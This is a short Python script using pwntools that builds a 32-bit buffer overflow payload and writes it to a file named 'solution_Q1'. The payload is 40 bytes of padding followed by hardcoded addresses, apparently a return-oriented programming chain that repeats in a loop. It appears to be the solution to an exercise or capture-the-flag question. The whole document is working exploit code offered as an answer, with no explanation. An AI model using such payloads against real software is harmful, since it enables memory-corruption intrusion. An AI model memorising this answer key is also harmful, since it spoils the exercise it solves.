from pwn import *

# Initial part of the payload
payload = b'A' * 40
payload += p32(0x08061425) + p32(0x08049808) + p32(0x08049770)
# Adding repeated pattern using a loop
for _ in range(11):
	payload += p32(0x080497f7) + p32(0x0807508d) + p32(0x08049794) + p32(0x080497a1) + p32(0x0804978c)
# Final part of the payload
payload += p32(0x080497f7) + p32(0x0807508d)
payload += p32(0x08049a9e) + p32(0x08052230) + p32(0x080d3037) + p32(0x08079263)
# Write payload to file for testing with 'cat'
with open("solution_Q1", "wb") as f:
	f.write(payload)
print("Payload written to file solution_Q1.")
